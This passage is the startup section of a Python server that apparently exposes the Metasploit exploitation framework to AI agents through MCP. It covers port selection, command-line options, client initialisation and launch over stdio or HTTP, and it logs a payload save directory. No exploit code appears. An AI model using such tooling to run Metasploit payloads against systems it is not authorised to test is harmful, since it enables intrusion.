        raise HTTPException(status_code=500, detail=f"Internal Server Error during health check: {e}")

# --- Server Startup Logic ---

def find_available_port(start_port, host='127.0.0.1', max_attempts=10):
    """Finds an available TCP port."""
    for port in range(start_port, start_port + max_attempts):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind((host, port))
                logger.debug(f"Port {port} on {host} is available.")
                return port
            except socket.error:
                logger.debug(f"Port {port} on {host} is in use, trying next.")
                continue
    logger.warning(f"Could not find available port in range {start_port}-{start_port+max_attempts-1} on {host}. Using default {start_port}.")
    return start_port

if __name__ == "__main__":
    # --- Setup argument parser for transport mode and server configuration ---
    import argparse
    
    parser = argparse.ArgumentParser(description='Run Streamlined Metasploit MCP Server')
    parser.add_argument(
        '--transport', 
        choices=['http', 'stdio'], 
        default='http',
        help='MCP transport mode to use (http=SSE, stdio=direct pipe)'
    )
    parser.add_argument('--host', default='127.0.0.1', help='Host to bind the HTTP server to (default: 127.0.0.1)')
    parser.add_argument('--port', type=int, default=None, help='Port to listen on (default: find available from 8085)')
    parser.add_argument('--reload', action='store_true', help='Enable auto-reload (for development)')
    parser.add_argument('--find-port', action='store_true', help='Force finding an available port starting from --port or 8085')
    parser.add_argument('--debug', action='store_true', help='Make output more verbose')
    args = parser.parse_args()

    if args.debug:
        LOG_LEVEL = 'debug'
        logger.setLevel(LOG_LEVEL.upper())

    # Initialize MSF Client - Critical for server function
    try:
        initialize_msf_client()
    except (ValueError, ConnectionError, RuntimeError) as e:
        logger.critical(f"CRITICAL: Failed to initialize Metasploit client on startup: {e}. Server cannot function.")
        sys.exit(1) # Exit if MSF connection fails at start

    if args.transport == 'stdio':
        logger.info("Starting MCP server in STDIO transport mode.")
        try:
            mcp.run(transport="stdio")
        except Exception as e:
            logger.exception("Error during MCP stdio run loop.")
            sys.exit(1)
        logger.info("MCP stdio server finished.")
    else:  # HTTP/SSE mode (default)
        logger.info("Starting MCP server in HTTP/SSE transport mode.")
        
        # Check port availability
        check_host = args.host if args.host != '0.0.0.0' else '127.0.0.1'
        selected_port = args.port
        if selected_port is None or args.find_port:
            start_port = selected_port if selected_port is not None else 8085
            selected_port = find_available_port(start_port, host=check_host)

        logger.info(f"Starting Uvicorn HTTP server on http://{args.host}:{selected_port}")
        logger.info(f"MCP SSE Endpoint: /sse")
        logger.info(f"API Docs available at http://{args.host}:{selected_port}/docs")
        logger.info(f"Payload Save Directory: {PAYLOAD_SAVE_DIR}")
        logger.info(f"Auto-reload: {'Enabled' if args.reload else 'Disabled'}")

        uvicorn.run(
            "__main__:app",
            host=args.host,
            port=selected_port,
            reload=args.reload,
            log_level=LOG_LEVEL.lower()
        )
